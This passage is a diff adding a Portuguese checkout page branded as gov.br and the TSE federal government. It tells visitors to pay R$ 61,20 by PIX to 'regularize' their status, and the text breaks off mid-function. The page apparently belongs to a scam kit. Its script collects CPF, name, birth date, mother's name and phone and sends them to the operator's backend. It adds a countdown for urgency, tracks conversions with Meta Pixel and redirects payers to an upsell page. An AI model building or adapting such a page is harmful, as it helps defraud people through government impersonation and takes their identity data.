@@ -1,0 +1,1210 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script async="" src="js/fbevents.js"></script><script src="js/pixel.js" async="" defer=""></script>
+  <meta charset="utf-8">
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6a5a898bc9cada68ef95444e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4208934256034751');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1917961022187197&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
+  <title>Pagamento PIX —</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+  <script src="js/tracking.js"></script>
+</head>
+<body>
+  <!-- Container para Toast Notifications -->
+  <div class="toast-container" id="toastContainer"></div>
+
+  <div class="header">
+    <img src="images/iconegov.png" alt="gov.br">
+    <span class="header-badge" id="header-badge">NOME PESSOA</span>
+  </div>
+
+  <div class="container">
+    <div class="urgency">
+      <span class="icon">⏰</span>
+      <span> Realize o pagamento para regularizar/justificar.</span>
+    </div>
+
+    <div class="info-card">
+      <div class="titulo">Resumo da regularização</div>
+      <div class="info-row">
+        <span class="info-label">Nome</span>
+        <span class="info-value" id="acordo-nome">NOME PESSOA</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">CPF</span>
+        <span class="info-value" id="acordo-cpf">CPF PESSOA</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Código da Regularização</span>
+        <span class="info-value">TVJ246</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">VALOR</span>
+        <span class="info-value destaque">R$ 61,20</span>
+      </div>
+    </div>
+
+    <div class="info-card" id="confirmacao-card">
+      <div class="titulo">Confirme seus dados</div>
+      <div class="info-row">
+        <span class="info-label">Nome</span>
+        <span class="info-value" id="conf-nome">NOME PESSOA</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">CPF</span>
+        <span class="info-value" id="conf-cpf">CPF PESSOA</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Telefone (WhatsApp) <small style="color:#999;font-weight:400">(opcional)</small></span>
+        <input type="tel" id="conf-phone" inputmode="numeric" placeholder="(11) 99999-9999" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; width: 100%; font-size: 14px;">
+      </div>
+      
+      <!-- Seleção de método de pagamento -->
+      <div class="payment-method-selector">
+        <div class="titulo" style="margin-bottom: 15px; margin-top: 15px;">Escolha o método de pagamento</div>
+        <div class="payment-options">
+          <button type="button" id="btn-select-pix" class="payment-option-btn active">
+            <div class="payment-option-content">
+              <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC9UlEQVR4nO1a3U7UUBDuCxj1Wi/0SgT8SdRLRe+UznS98THUB1B8E2OC8aYzFRI6pxjfQMEb9RFQWQUimiiRRDP7RwMtS09PS9cwyUnIbpnzfbNz5sw3u553ZP+Z+fGLk2D4CQoto/BPEP6BhpdQaKY1N3fCa7L5Cd1Ew1/R8N/MJdzWZ7wmGgjdQaHfueB7CwxvYUwtbxTBYxNJQEHwjSIBluDTJED47kiCP1QS4Ag8HgYJ1+CxThJVgcc6SQTz88eCmG+A8FMwvF0auNAf9eUndF19e7XfvMJr9uB5DUw4VSnIIImCTs3e2XgdDc3eNtFpfX86Di/v2z7kpgttBEJX1Yf6AuHnXd876aR7uwa/A0BoBRZ5TJ/zF6NLBUms98HDIo+B0Ke8M2FN4iAHFoRWMaGJgiTW/Ti80g1QeE4D4fzGLlJtlIS/EE3q/6Ghi0NIFAKPNiRsSmWaxHT88jwa/pxxYNtKMAU+M21KkdCqkpfzBziUXwITjmeSEG63JLzQAW/CcX3Wbg/eytUTqqRsqsluEoMzsRBNoqH3ugYpltCELXhMByNL2XVkYBnHGSTS5gS86e0R8+OM3Od3Lpz3SGwGwg/xVXhWl/6tr7nyj4aX9hBQAe5wg0oXGNrMSCGnEap2CX/P+ARo2WWE0ET3W8ncGU0hSOiBywCB4bdZBGZG5hAbfrSHgJam7mXjBryWThD+CMIfXJZREFq99zo8vodA1RfZ4BYueZHBsPa720rwr6JR6Ud+n37Iqg9C+37oYCQKdqTVN3OF2ul0zhdop/taIKiqnS4qaCxU2W5Bs5IH3r0q62hgmvUXwlN98CD0zeLQb4CJrvUlpfpM62sn4IeSi/lWWVHv1z1u1xqspQyEnrkYq4Dh7a6vcCq3vo/SYAurnlhXOVrEusbtVQx3se7vClyO1/GwvuiwaTsaA74siUaAtyXRKPBFSTQS/K5xe3u/zrXycXpZU2WncxvVrfozg85PDYTeqAys/KY9Mq9++wfSId/ImvikTwAAAABJRU5ErkJggg==" alt="pix" width="32" height="32" style="margin-right: 10px; object-fit: contain;">
+              <div>
+                <strong>PIX</strong>
+                <small>Pagamento instantâneo</small>
+              </div>
+            </div>
+          </button>
+          
+        </div>
+      </div>
+      
+      <button type="button" id="btn-confirmar" class="btn-confirmar">Confirmar dados e gerar PIX</button>
+    </div>
+    
+    <!-- Formulário de Cartão de Crédito -->
+    
+
+    <div class="pix-card" id="pix-card" style="display: none;">
+      <div class="valor-pix" id="valor-pix">—</div>
+      <div class="valor-desc">Valor total da Regularização</div>
+
+      <div class="loading-wrap" id="loading-wrap">
+        <div class="spinner"></div>
+        <div class="loading-txt">Gerando seu PIX...</div>
+      </div>
+
+      <div class="qr-wrap" id="qr-wrap">
+        <div class="instrucao">
+          <ol>
+            <li>Abra o app do seu banco</li>
+            <li>Escolha a opção <strong>Pagar com PIX</strong></li>
+            <li>Escaneie o código abaixo OU copie e cole o código</li>
+          </ol>
+        </div>
+
+        <div class="qr-container">
+          <canvas id="qr-img" width="280" height="280"></canvas>
+          <div id="qr-loading" class="qr-loading">Gerando código...</div>
+          <div id="qr-error" class="qr-error" style="display: none;">Erro ao gerar QR Code</div>
+        </div>
+
+        <div class="copy-wrap">
+          <div class="copy-label">PIX Copia e Cola</div>
+          <div class="copy-code" id="copy-code">—</div>
+          <button class="btn-copy" id="btn-copy" onclick="copiarPix()">Copiar código PIX</button>
+        </div>
+        <div class="aguardando" id="aguardando">
+          <div class="dot-blink"></div>
+          Aguardando pagamento...
+        </div>
+        <div class="countdown-wrap" id="countdown-wrap">
+          PIX expira em <span class="countdown-num" id="countdown-num">15:00</span>
+        </div>
+
+        
+
+        <div class="success-screen" id="success-screen">
+          <div class="success-icon">✅</div>
+          <div class="success-title">Pagamento confirmado!</div>
+          <div class="success-desc">
+            Seu nome será limpo em até <strong>72 horas úteis.</strong><br>
+            Guarde o código do acordo: <strong id="acordo-ok">—</strong>
+          </div>
+        </div>
+        <div class="erro-screen" id="erro-screen">
+          <div class="erro-icon">❌</div>
+          <div class="erro-title">Pagamento não identificado</div>
+          <div class="erro-desc">O PIX expirou. Clique abaixo para gerar um novo código.</div>
+          <button class="btn-retry" onclick="location.reload()">Tentar novamente</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <img src="images/iconegov.png" alt="gov.br"><br>
+      TSE — GOVERNO FEDERAL<br>
+      Pagamento processado com segurança via PIX
+    </div>
+  </div>
+
+  <script>
+  /**
+   * Integração PIX Blackcat via backend PHP.
+   * As credenciais ficam somente em checkout/config.php.
+   */
+  function params() {
+    var p = new URLSearchParams(window.location.search);
+    var s = {};
+    try {
+      s = JSON.parse(sessionStorage.getItem('desenrola.pagamento') || '{}');
+      if (typeof s === 'string') s = JSON.parse(s || '{}');
+    } catch (_) { s = {}; }
+    // Dados salvos pela página anterior (login/CPF) no localStorage
+    var l = {};
+    try {
+      l = JSON.parse(localStorage.getItem('cdt_esa') || '{}');
+      if (typeof l === 'string') l = JSON.parse(l || '{}');
+    } catch (_) { l = {}; }
+    var cpfLocal = l.CPF || l.cpf || localStorage.getItem('cd_esa') || '';
+    var nomeLocal = l.NOME || l.nome || l.name || '';
+    var phoneLocal = l.TELEFONE || l.telefone || l.phone || '';
+    var emailLocal = l.EMAIL || l.email || '';
+    return {
+      cpf:    p.get('cpf')    || s.cpf    || cpfLocal || '',
+      nome:   p.get('nome')   || p.get('name') || s.nome || s.name || nomeLocal || 'Cliente',
+      phone:  p.get('phone')  || p.get('telefone') || s.phone || s.telefone || phoneLocal || '',
+      email:  p.get('email')  || s.email  || emailLocal || '',
+      valor:  '6120',
+      acordo: p.get('acordo') || s.acordo || '',
+      // Parâmetros UTM
+      utm_source: p.get('utm_source') || s.utm_source || '',
+      utm_medium: p.get('utm_medium') || s.utm_medium || '',
+      utm_campaign: p.get('utm_campaign') || s.utm_campaign || '',
+      utm_content: p.get('utm_content') || s.utm_content || '',
+      utm_term: p.get('utm_term') || s.utm_term || '',
+      xcod: p.get('xcod') || s.xcod || '',
+      sck: p.get('sck') || s.sck || '',
+      src: p.get('src') || s.src || '',
+      utm_id: p.get('utm_id') || s.utm_id || ''
+    };
+  }
+  function formatCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  var u = params();
+  // Dados completos do localStorage (NOME, CPF, NASC, NOME_MAE, SEXO)
+  var LOCAL_DADOS = {};
+  try {
+    LOCAL_DADOS = JSON.parse(localStorage.getItem('cdt_esa') || '{}');
+    if (typeof LOCAL_DADOS === 'string') LOCAL_DADOS = JSON.parse(LOCAL_DADOS || '{}');
+  } catch (_) { LOCAL_DADOS = {}; }
+  var CPF    = u.cpf;
+  var NOME   = u.nome || 'Cliente';
+  var PHONE  = u.phone || '';
+  var EMAIL  = u.email || '';
+  var ACORDO = u.acordo;
+  var VALOR_EXIBIDO = '';
+  var PIX_AMOUNT_CENTS = 6120; // R$ 61,20 (também fixado no PHP)
+
+  // Mostrar info do acordo — só preenche quando o DOM estiver pronto
+  // e apenas se o elemento existir (suporta vários ids de layout)
+  function setText(id, val) {
+    var el = document.getElementById(id);
+    if (el) el.textContent = val;
+  }
+  function preencherDadosCliente() {
+    var cpfFmt = formatCPF(CPF) || '—';
+    setText('acordo-nome',   NOME);
+    setText('acordo-cpf',    cpfFmt);
+    setText('acordo-codigo', ACORDO || '—');
+    setText('header-badge',  NOME.split(' ')[0]);
+    // ids alternativos usados em outros layouts
+    setText('conf-nome',     NOME);
+    setText('conf-cpf',      cpfFmt);
+    setText('nomeUsuario',   NOME);
+    setText('cpfUsuario',    cpfFmt);
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', preencherDadosCliente);
+  } else {
+    preencherDadosCliente();
+  }
+
+  var transactionId = null;
+  var pollingTimer  = null;
+  var countdownTimer = null;
+  var segundos = 15 * 60;
+
+  /**
+   * Gera QR visual no canvas a partir do string EMV (copyPaste).
+   * Usa qrcode.js pelo CDN quando a Blackcat não devolver a imagem pronta.
+   */
+  function loadScript(src) {
+    return new Promise(function (resolve, reject) {
+      var s = document.createElement('script');
+      s.src = src; s.async = true;
+      s.onload = resolve;
+      s.onerror = function () { reject(new Error('failed to load ' + src)); };
+      document.head.appendChild(s);
+    });
+  }
+
+  function renderQrClientSide(canvasEl, text) {
+    var qrLoading = document.getElementById('qr-loading');
+    var qrError = document.getElementById('qr-error');
+
+    if (!canvasEl || !text) return Promise.reject(new Error('Dados do QR Code ausentes.'));
+    if (qrLoading) qrLoading.style.display = 'block';
+    if (qrError) qrError.style.display = 'none';
+
+    var cdnSrc = 'https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js';
+    var carregarBiblioteca = (typeof QRCode !== 'undefined' || typeof qrcode !== 'undefined')
+      ? Promise.resolve()
+      : loadScript(cdnSrc);
+
+    return carregarBiblioteca.then(function () {
+      if (typeof QRCode === 'undefined' && typeof qrcode === 'undefined') {
+        throw new Error('QRCode library not found');
+      }
+
+      // Limpar canvas
+      var ctx = canvasEl.getContext('2d');
+      ctx.clearRect(0, 0, canvasEl.width, canvasEl.height);
+
+      // Renderizar QR Code
+      if (typeof QRCode !== 'undefined' && typeof QRCode.toCanvas === 'function') {
+        // Bibliotecas que expõem QRCode.toCanvas
+        QRCode.toCanvas(canvasEl, text, {
+          errorCorrectionLevel: 'H',
+          type: 'image/png',
+          quality: 0.95,
+          margin: 1,
+          width: 280,
+          color: {
+            dark: '#000000',
+            light: '#ffffff'
+          }
+        }, function (error) {
+          if (error) {
+            console.error('Erro QRCode:', error);
+            if (qrLoading) qrLoading.style.display = 'none';
+            if (qrError) qrError.style.display = 'block';
+            return;
+          }
+          if (qrLoading) qrLoading.style.display = 'none';
+        });
+      } else if (typeof qrcode === 'function') {
+        // Bibliotecas qrcode-generator (função global qrcode)
+        try {
+          var qr = qrcode(0, 'M');
+          qr.addData(text);
+          qr.make();
+          var dataUrl = qr.createDataURL(4, 0);
+
+          var img = new Image();
+          img.onload = function () {
+            ctx.drawImage(img, 0, 0, canvasEl.width, canvasEl.height);
+            if (qrLoading) qrLoading.style.display = 'none';
+          };
+          img.onerror = function () {
+            console.error('Erro ao carregar QR Code image');
+            if (qrLoading) qrLoading.style.display = 'none';
+            if (qrError) qrError.style.display = 'block';
+          };
+          img.src = dataUrl;
+        } catch (e) {
+          console.error('Erro ao renderizar QR:', e);
+          if (qrLoading) qrLoading.style.display = 'none';
+          if (qrError) qrError.style.display = 'block';
+        }
+      } else if (typeof QRCode === 'function') {
+        // qrcodejs (CDN de reserva)
+        var holder = document.createElement('div');
+        holder.style.position = 'fixed';
+        holder.style.left = '-9999px';
+        document.body.appendChild(holder);
+        new QRCode(holder, {
+          text: text,
+          width: 280,
+          height: 280,
+          colorDark: '#000000',
+          colorLight: '#ffffff',
+          correctLevel: QRCode.CorrectLevel.H
+        });
+        setTimeout(function () {
+          var generatedCanvas = holder.querySelector('canvas');
+          var generatedImage = holder.querySelector('img');
+          var finish = function (source) {
+            ctx.drawImage(source, 0, 0, canvasEl.width, canvasEl.height);
+            holder.remove();
+            if (qrLoading) qrLoading.style.display = 'none';
+          };
+          if (generatedCanvas) {
+            finish(generatedCanvas);
+          } else if (generatedImage) {
+            if (generatedImage.complete) finish(generatedImage);
+            else generatedImage.onload = function () { finish(generatedImage); };
+          } else {
+            holder.remove();
+            if (qrLoading) qrLoading.style.display = 'none';
+            if (qrError) qrError.style.display = 'block';
+          }
+        }, 50);
+      }
+    }).catch(function (err) {
+      console.error('Erro ao carregar QR Code library:', err);
+      if (qrLoading) qrLoading.style.display = 'none';
+      if (qrError) qrError.style.display = 'block';
+    });
+  }
+
+
+  // ===== INTEGRAÇÃO EXCLUSIVA BLACKCAT VIA PHP =====
+  async function gerarPix() {
+    try {
+      // Prioriza o WhatsApp digitado no card de confirmação.
+      var phoneField = document.getElementById('conf-phone');
+      if (phoneField && phoneField.value) {
+        PHONE = phoneField.value;
+      }
+      if (!String(PHONE || '').replace(/\D/g, '')) {
+        PHONE = randomPhone();
+      }
+
+      // Preparar dados para envio ao backend
+      var cpfDigits = String(CPF || '').replace(/\D/g, '');
+      var emailFallback = 'cliente' + (cpfDigits ? '+' + cpfDigits.slice(-6) : '') + '@email.com';
+      var payload = {
+        nome: NOME,
+        email: EMAIL || emailFallback,
+        cpf: CPF,
+        telefone: PHONE || '',
+        valor: PIX_AMOUNT_CENTS, // informativo; o PHP ignora alterações e usa 6120
+        nascimento: LOCAL_DADOS.NASC || '',
+        nome_mae: LOCAL_DADOS.NOME_MAE || '',
+        sexo: LOCAL_DADOS.SEXO || ''
+      };
+
+      // Adicionar parâmetros UTM se existirem
+      var utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck', 'src', 'utm_id'];
+      utmFields.forEach(function(field) {
+        if (u[field]) payload[field] = u[field];
+      });
+
+      console.log('[PIX] Enviando dados para backend:', payload);
+
+      // Chamar backend PHP
+      var response = await fetch('pagamento.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      var result = await response.json().catch(function () { return {}; });
+      console.log('[PIX] Resposta do backend:', result);
+
+      if (!response.ok) {
+        throw new Error(result.message || ('Erro na requisição: HTTP ' + response.status));
+      }
+
+      if (!result.success) {
+        throw new Error(result.message || 'Erro ao gerar PIX');
+      }
+
+      // Extrair dados da resposta
+      transactionId = result.paymentCode || result.token;
+      habilitarUploadComprovante(transactionId);
+      var pixCode = result.pixCopiaECola || result.pixCode;
+
+      if (!pixCode) {
+        throw new Error('Código PIX não retornado pelo servidor');
+      }
+      
+      
+      var confirmacaoCard = document.getElementById('confirmacao-card');
+      var pixCard = document.getElementById('pix-card');
+      var loadingWrap = document.getElementById('loading-wrap');
+      var qrWrap = document.getElementById('qr-wrap');
+
+      if (confirmacaoCard) confirmacaoCard.style.display = 'none';
+      if (pixCard) pixCard.style.display = 'block';
+      if (loadingWrap) loadingWrap.style.display = 'none';
+      if (qrWrap) qrWrap.style.display = 'block';
+
+      VALOR_EXIBIDO = 'R$ ' + (PIX_AMOUNT_CENTS / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      setText('valor-pix', VALOR_EXIBIDO);
+
+      // Mostrar código PIX para copiar
+      setText('copy-code', pixCode);
+
+      if (pixCard) {
+        pixCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+
+      // Gerar QR Code visual - usa qrCodeUrl do backend como prioridade
+      var qrCodeUrl = result.qrCodeUrl;
+      if (qrCodeUrl) {
+        var canvas = document.getElementById('qr-img');
+        var img = document.createElement('img');
+        img.src = qrCodeUrl;
+        img.width = 280;
+        img.height = 280;
+        img.style.maxWidth = '100%';
+        img.style.display = 'block';
+        img.style.margin = '0 auto';
+        img.style.background = 'white';
+        img.style.borderRadius = '8px';
+        img.id = 'qr-img';
+        img.onload = function() {
+          if (canvas.parentNode) canvas.parentNode.replaceChild(img, canvas);
+          document.getElementById('qr-loading').style.display = 'none';
+          document.getElementById('qr-error').style.display = 'none';
+        };
+        img.onerror = function() {
+          renderQrClientSide(canvas, pixCode).catch(function() {});
+        };
+      } else {
+        renderQrClientSide(document.getElementById('qr-img'), pixCode).catch(function (err) {
+          console.error('Erro ao renderizar QR Code:', err);
+        });
+      }
+
+      iniciarCountdown();
+      // Guardar para refresh
+      try {
+        sessionStorage.setItem('desenrola.pagamento', JSON.stringify({
+          cpf: CPF, 
+          nome: NOME, 
+          email: EMAIL,
+          telefone: PHONE,
+          valor: VALOR_EXIBIDO, 
+          acordo: ACORDO, 
+          transactionId: transactionId,
+          pixCode: pixCode,
+          qrCodeUrl: qrCodeUrl,
+          utm_source: u.utm_source, utm_medium: u.utm_medium,
+          utm_campaign: u.utm_campaign, utm_content: u.utm_content,
+          utm_term: u.utm_term, utm_id: u.utm_id,
+          xcod: u.xcod, sck: u.sck, src: u.src
+        }));
+      } catch (_) {}
+      pollingTimer = setInterval(verificarStatus, 2000);
+      verificarStatus();
+    } catch (e) {
+      console.error('Erro gerarPix:', e);
+      mostrarErro(e && e.message ? e.message : 'Não foi possível conectar. Verifique sua conexão.');
+    }
+  }
+
+  // Após a confirmação na Blackcat, abre o upsell da raiz do domínio.
+  function redirecionarAprovado(txId) {
+    var urlParams = new URLSearchParams(window.location.search);
+    var redirectUrl = new URL('/up/', window.location.origin);
+    redirectUrl.searchParams.set('funil_ok', '1');
+    if (NOME) redirectUrl.searchParams.set('nome', NOME);
+    if (CPF) redirectUrl.searchParams.set('cpf', CPF);
+    if (EMAIL) redirectUrl.searchParams.set('email', EMAIL);
+    if (PHONE) redirectUrl.searchParams.set('telefone', PHONE);
+    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
+      'utm_id', 'xcod', 'sck', 'src', 'fbclid'].forEach(function (field) {
+      var value = urlParams.get(field) || u[field];
+      if (value) redirectUrl.searchParams.set(field, value);
+    });
+    window.location.href = redirectUrl.toString();
+  }
+
+  var statusEmAndamento = false;
+  var pagamentoConfirmado = false;
+  async function verificarStatus() {
+    if (!transactionId || statusEmAndamento || pagamentoConfirmado) return;
+    statusEmAndamento = true;
+    try {
+      var response = await fetch('verificar.php?id=' + encodeURIComponent(transactionId), { cache: 'no-store' });
+      
+      if (!response.ok) {
+        console.error('Erro ao verificar status: HTTP ' + response.status);
+        return;
+      }
+
+      var result = await response.json();
+      console.log('[Status] Resposta:', result);
+
+      if (result.success && result.status) {
+        var status = String(result.status).toLowerCase();
+
+        // Verifica se o pagamento foi aprovado
+        if (result.paid === true && status === 'approved') {
+          pagamentoConfirmado = true;
+          pararPolling();
+
+          // ===== Meta Pixel: Purchase (client-side, deduplicado com CAPI via eventID) =====
+          try {
+            if (typeof fbq === 'function' && transactionId) {
+              fbq('track', 'Purchase', {
+                value: (PIX_AMOUNT_CENTS / 100),
+                currency: 'BRL'
+              }, {
+                eventID: 'purchase_' + transactionId
+              });
+              console.log('[Meta Pixel] Purchase disparado — eventID:', 'purchase_' + transactionId);
+            }
+          } catch (e) { console.error('[Meta Pixel] erro Purchase:', e); }
+
+          // ===== Meta CAPI (server-side) — envia payload completo pro backend =====
+          try {
+            var getCookie = function (n) {
+              var m = document.cookie.match('(?:^|; )' + n + '=([^;]+)');
+              return m ? decodeURIComponent(m[1]) : null;
+            };
+            var urlParamsCapi = new URLSearchParams(window.location.search);
+            var capiPayload = {
+              transactionId: transactionId,
+              value: (PIX_AMOUNT_CENTS / 100),
+              value_cents: PIX_AMOUNT_CENTS,
+              currency: 'BRL',
+              email: EMAIL || '',
+              phone: PHONE || '',
+              nome: NOME || '',
+              cpf: CPF || '',
+              fbp: getCookie('_fbp'),
+              fbc: getCookie('_fbc'),
+              fbclid: urlParamsCapi.get('fbclid') || '',
+              event_source_url: window.location.href
+            };
+            fetch('meta-capi.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(capiPayload),
+              keepalive: true
+            }).then(function (r) { return r.json(); })
+              .then(function (j) { console.log('[Meta CAPI] resposta:', j); })
+              .catch(function (err) { console.error('[Meta CAPI] erro:', err); });
+          } catch (e) { console.error('[Meta CAPI] erro no envio:', e); }
+
+          setText('acordo-ok', ACORDO || transactionId);
+          ['aguardando', 'countdown-wrap'].forEach(function (id) {
+            var el = document.getElementById(id);
+            if (el) el.style.display = 'none';
+          });
+          ['.copy-wrap', '.qr-container', '.instrucao'].forEach(function (selector) {
+            var el = document.querySelector(selector);
+            if (el) el.style.display = 'none';
+          });
+          var successScreen = document.getElementById('success-screen');
+          if (successScreen) successScreen.style.display = 'block';
+          
+          // Mostra a confirmação por 2s antes de abrir /up/.
+          setTimeout(function () {
+            redirecionarAprovado(transactionId);
+          }, 2000);
+        }
+      }
+    } catch (e) {
+      console.error('Erro verificarStatus:', e);
+    } finally {
+      statusEmAndamento = false;
+    }
+  }
+
+  function pararPolling() {
+    if (pollingTimer) clearInterval(pollingTimer);
+    if (countdownTimer) clearInterval(countdownTimer);
+  }
+
+  // Retoma a consulta do mesmo PIX após atualizar a página, sem gerar outro pagamento.
+  function retomarPagamento() {
+    var salvo;
+    try { salvo = JSON.parse(sessionStorage.getItem('desenrola.pagamento') || '{}'); }
+    catch (_) { return; }
+    if (!salvo || !salvo.transactionId ||
+        (salvo.cpf && CPF && String(salvo.cpf).replace(/\D/g, '') !== String(CPF).replace(/\D/g, ''))) return;
+
+    transactionId = salvo.transactionId;
+    if (salvo.pixCode) {
+      var confirmacaoCard = document.getElementById('confirmacao-card');
+      var pixCard = document.getElementById('pix-card');
+      var loadingWrap = document.getElementById('loading-wrap');
+      var qrWrap = document.getElementById('qr-wrap');
+      if (confirmacaoCard) confirmacaoCard.style.display = 'none';
+      if (pixCard) pixCard.style.display = 'block';
+      if (loadingWrap) loadingWrap.style.display = 'none';
+      if (qrWrap) qrWrap.style.display = 'block';
+      setText('valor-pix', 'R$ ' + (PIX_AMOUNT_CENTS / 100).toLocaleString('pt-BR', {minimumFractionDigits: 2}));
+      setText('copy-code', salvo.pixCode);
+      var qrCanvas = document.getElementById('qr-img');
+      if (qrCanvas && salvo.qrCodeUrl) {
+        var qrImage = document.createElement('img');
+        qrImage.id = 'qr-img';
+        qrImage.src = salvo.qrCodeUrl;
+        qrImage.width = qrImage.height = 280;
+        qrImage.style.maxWidth = '100%';
+        qrImage.onerror = function () {
+          qrImage.parentNode.replaceChild(qrCanvas, qrImage);
+          renderQrClientSide(qrCanvas, salvo.pixCode).catch(function () {});
+        };
+        qrCanvas.parentNode.replaceChild(qrImage, qrCanvas);
+      } else if (qrCanvas) {
+        renderQrClientSide(qrCanvas, salvo.pixCode).catch(function () {});
+      }
+      habilitarUploadComprovante(transactionId);
+      iniciarCountdown();
+    }
+    pollingTimer = setInterval(verificarStatus, 2000);
+    verificarStatus();
+  }
+
+  function habilitarUploadComprovante(txId) {
+    var btn  = document.getElementById('comprovante-btn');
+    var inp  = document.getElementById('comprovante-file');
+    var hint = document.getElementById('comprovante-hint');
+    if (!btn || !inp) return;
+    btn.disabled = false;
+    btn.style.background = '#1351B4';
+    btn.style.cursor = 'pointer';
+    inp.disabled = false;
+    if (hint) hint.style.display = 'none';
+    btn.onclick = function () { inp.click(); };
+    inp.onchange = function () {
+      if (inp.files && inp.files[0]) uploadComprovante(inp.files[0], txId);
+    };
+  }
+
+  function uploadComprovante(file, txId) {
+    var statusEl = document.getElementById('comprovante-status');
+    var btn = document.getElementById('comprovante-btn');
+    if (statusEl) statusEl.textContent = 'Enviando comprovante...';
+    if (btn) { btn.disabled = true; btn.style.background = '#ccc'; }
+
+    var fd = new FormData();
+    fd.append('transaction_id', txId);
+    fd.append('file', file);
+
+    fetch('comprovante.php', { method: 'POST', body: fd })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.success) {
+          if (statusEl) statusEl.textContent = 'Comprovante enviado! Redirecionando...';
+          pararPolling();
+          setTimeout(function () { redirecionarAprovado(txId); }, 1200);
+        } else {
+          if (statusEl) statusEl.textContent = 'Erro: ' + (data.message || 'Tente novamente.');
+          if (btn) { btn.disabled = false; btn.style.background = '#1351B4'; }
+        }
+      })
+      .catch(function () {
+        if (statusEl) statusEl.textContent = 'Falha na conexão. Tente novamente.';
+        if (btn) { btn.disabled = false; btn.style.background = '#1351B4'; }
+      });
+  }
+
+  function iniciarCountdown() {
+    var el = document.getElementById('countdown-num');
+    countdownTimer = setInterval(function () {
+      segundos--;
+      if (segundos <= 0) {
+        clearInterval(countdownTimer);
+        // A Blackcat pode aprovar o PIX depois do contador visual; segue consultando.
+        var countdown = document.getElementById('countdown-wrap');
+        if (countdown) countdown.style.display = 'none';
+        return;
+      }
+      var m = String(Math.floor(segundos / 60)).padStart(2, '0');
+      var s = String(segundos % 60).padStart(2, '0');
+      el.textContent = m + ':' + s;
+      el.classList.toggle('urgente', segundos < 120);
+    }, 1000);
+  }
+
+  function mostrarErroPix() {
+    document.getElementById('aguardando').style.display = 'none';
+    document.getElementById('countdown-wrap').style.display = 'none';
+    document.querySelector('.copy-wrap').style.display = 'none';
+    document.getElementById('qr-img').style.display = 'none';
+    document.querySelector('.instrucao').style.display = 'none';
+    document.getElementById('erro-screen').style.display = 'block';
+  }
+
+  function mostrarErro(msg) {
+    document.getElementById('loading-wrap').innerHTML =
+      '<div style="color:#DC2626;font-size:14px;padding:10px 0">' + msg +
+      '<br><br><button onclick="location.reload()" class="btn-retry" style="margin-top:8px">Tentar novamente</button></div>';
+  }
+
+  function copiarPix() {
+    var code = document.getElementById('copy-code').textContent;
+    var done = function () {
+      var btn = document.getElementById('btn-copy');
+      btn.textContent = '✔ Código copiado!';
+      btn.classList.add('copiado');
+      setTimeout(function () {
+        btn.textContent = 'Copiar código PIX';
+        btn.classList.remove('copiado');
+      }, 3000);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(code).then(done).catch(function () {
+        // Fallback
+        var ta = document.createElement('textarea');
+        ta.value = code; ta.style.position = 'fixed'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand('copy'); } catch (_) {}
+        ta.remove();
+        done();
+      });
+    } else {
+      var ta = document.createElement('textarea');
